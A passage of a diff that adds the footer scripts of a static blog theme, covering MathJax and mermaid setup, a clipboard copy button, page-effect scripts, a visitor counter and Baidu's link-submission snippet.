+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+  });
+
+  MathJax.Hub.Queue(function() {
+      var all = MathJax.Hub.getAllJax(), i;
+      for(i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+      }
+  });
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/mathjax@2.7.6/unpacked/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script>
+  var ayerConfig = {
+    mathjax: true
+  }
+</script>
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+<!-- ClickLove -->
+
+<!-- ClickBoom1 -->
+
+<!-- ClickBoom2 -->
+
+
+<script src="/js/clickBoom2.js"></script>
+
+
+<!-- CodeCopy -->
+
+
+<link rel="stylesheet" href="/css/clipboard.css">
+
+<script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+
+
+<!-- CanvasBackground -->
+
+
+<script src="/js/dz.js"></script>
+
+
+<!-- mermaid -->
+
+  <script src='https://cdn.bootcdn.net/ajax/libs/mermaid/8.5.2/mermaid.min.js'></script>
+  <script>
+    if (window.mermaid) {
+      mermaid.initialize({theme: 'forest'});
+    }
+  </script>
+
+<!-- baiduSpider auto push -->
+
+  <script>
+    (function(){
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https'){
+       bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+      }
+      else{
+      bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+      }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+    </script>
+
+
+    
+  </div>
+</body>
+
+</html>
